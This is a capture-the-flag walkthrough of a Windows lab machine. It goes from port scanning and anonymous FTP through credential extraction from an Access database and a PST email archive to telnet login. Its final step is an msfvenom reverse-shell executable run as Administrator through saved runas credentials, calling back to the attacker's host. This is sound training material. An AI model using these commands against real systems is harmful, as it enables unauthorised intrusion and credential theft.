- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.98 -oG scan
	/opt/extractports scan
	nmap -p21,23,80 -Pn -sCV 10.10.10.98 -oN ports
	```

- With the initial recognition I see that port 21 allows logging in with anonymous credentials. 
- I find 2 directories and each of them contains a file. I switch to binary mode and download the files.

	```python
	binary
	get Backups/backup.mdb
	get Engineer/Access Control.zip
	```

- I start by viewing the database schema, query the tables and decide to view the contents of the auth_user table. Within it I find 3 entries with potential credentials.

	```python
	mdb-tables backup.mdb
	mdb-schema backup.mdb
	mdb-sql backup.mdb
		select id,username,password from auth_user;
	```

- When I try to use the `engineer` credential via telnet on port 23 I get a different error message than if I use other credentials.

- When unzipping the zip file it asks me for a password. I try with the credentials found and I see that the user `engineer` is correct and I manage to unzip.

	```python
	7z x Access Control.zip
	```

- An `Access Control.pst` file is decompressed. A PST file, or personal storage table file, is a file format used to store e-mail messages, contacts and other items. 
- To be able to read the content of the file I use readpst and it generates a file that I can consult its content.

- When reading the email I find some credentials for the security user. I use these credentials to connect via telnet on port 23 and get access to the system and read the first flag.

	```python
	telnet 10.10.10.98 23
	```

- To increase my privileges I start listing files in the common directories and find a link inside the public desktop.
- When consulting its content I see that the terminal has stored the Administrator user credentials.

- I share an smb service to transfer files between my machine and the victim's machine.

	```python
	sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
	net use n: \\10.10.14.10\share /user:test test
	```

- I generate a binary to create a reverse shell. I run the binary using the stored credentials and I get a shell as Administrator and I can read the second system flag.
	
	```python
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1234 -f exe > pepe.exe
	
	nc -nlvp 1234
	
	runas /user:ACCESS\Administrator /savecred "C:\temp\pepe.exe"
	```
